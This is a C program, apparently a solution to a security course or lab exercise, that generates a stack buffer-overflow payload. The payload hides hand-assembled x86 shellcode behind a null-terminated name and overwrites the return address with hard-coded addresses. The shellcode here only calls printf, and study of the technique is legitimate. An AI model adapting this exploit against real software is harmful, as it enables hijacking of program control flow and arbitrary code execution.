#include <stdio.h>
#include <stdlib.h>

int main(void){
	int i;
	FILE *file = fopen("data10", "w");


	if (file == NULL){
		fprintf(stderr, "couldnt crete the file: data6");
		exit(-1);
	}

	/*place the name i want to display
	 *in the start of the buff*/

	fputc('G',file);
	fputc('x',file);

	/*null terimator after the name we want
	 *to display so the printf stops threre
	 *effectively hiding everything we put after.*/ 

	fputc(0x0, file);

	/*add the instraction we want to excecute*/
        /*	
	0:   6a 30                   push   $0x30                 pushing the arguments for the printf (1 ,0 and the printf string)
   	2:   6a 31                   push   $0x31
   	4:   68 f6 42 0e 08          push   $0x80e3068
   	9:   b8 60 10 05 08          mov    $0x8051060,%eax       the address of the printf
   	e:   ff d0                   call   *%eax                 
       10:   bb c2 9e 04 08          mov    $0x8049ec2,%ebx       return
       15:   ff e3                   jmp    *%ebx
	*/

	fputc(0x6a, file);
	fputc(0x30, file);

	fputc(0x6a, file);
	fputc(0x31, file);

	fputc(0x68, file);
	fputc(0xf6, file);
	fputc(0x42, file);
	fputc(0x0e, file);
	fputc(0x08, file);

	fputc(0xb8, file);
	fputc(0x60, file);
	fputc(0x10, file);
	fputc(0x05, file);
	fputc(0x08, file);

	fputc(0xff, file);
	fputc(0xd0, file);


	fputc(0xbb, file);
	fputc(0xc2, file);
	fputc(0x9e, file);
	fputc(0x04, file);
	fputc(0x08, file);

	fputc(0xff, file);
	fputc(0xe3, file);


	/*string to print(%d%d)*/
	fputc(0x25, file);
	fputc(0x63, file);
	
	fputc(0x25, file);
	fputc(0x63, file);
	
/*	fputc(0x0a, file);	
	fputc('\0', file);	
*/
	/*fill the veriabel c*/
	for(i = 0; i < 4; i++){
		fputc('i',file);
	}

	/*fill i with the intex to go 
         go to the return address*/

	fputc(0x32, file);

	/*fill the return address the addrss of the Name where the 
	 * instractions will be moved to and we excecute them there*/
	/*the address must be given in little endiant format*/
	/*0x80e42dc*/

	fputc(0xdc, file);
	fputc(0x42, file);
	fputc(0x0e, file);
	fputc(0x08, file);

	/*reajust the s to point at the Name+offset*/
	/*the address must be given in little endiant format*/
	fputc(0xdc, file);
	fputc(0x42, file);
	fputc(0x0e, file);
	fputc(0x08, file);

	fclose(file);

	return 0;
}

